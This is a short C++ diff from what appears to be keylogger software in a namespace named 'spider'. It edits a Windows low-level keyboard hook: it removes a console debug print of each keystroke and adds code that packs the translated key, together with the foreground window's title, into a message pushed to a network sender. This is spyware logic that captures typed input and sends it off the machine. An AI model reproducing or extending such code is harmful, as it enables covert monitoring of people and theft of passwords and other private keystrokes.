@@ -449,9 +449,6 @@ namespace spider
 		WORD            wBuf;
 		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT *)lParam);
 		GetKeyboardState(KeyState);
-		ToAscii(hooked.vkCode, hooked.scanCode, KeyState, &wBuf, 0);
-		std::cout << "Pressed: " << (char)wBuf << std::endl;
-		// TODO: treat special keys
 
 		std::array<char, MAX_PATH> currentWindow;
 		GetWindowTextA(GetForegroundWindow(), currentWindow.data(),
@@ -461,7 +458,8 @@ namespace spider
 		extractPath(cur);
 		msg.sys.currentWindow.fill(0);
 		std::copy(cur.begin(), cur.end(),
-		          msg.sys.currentWindow.data());
+			  msg.sys.currentWindow.data());
+		translateKey(hooked.vkCode, msg);
 		m_sendToNetwork->push(msg);
 	      }
 	  }
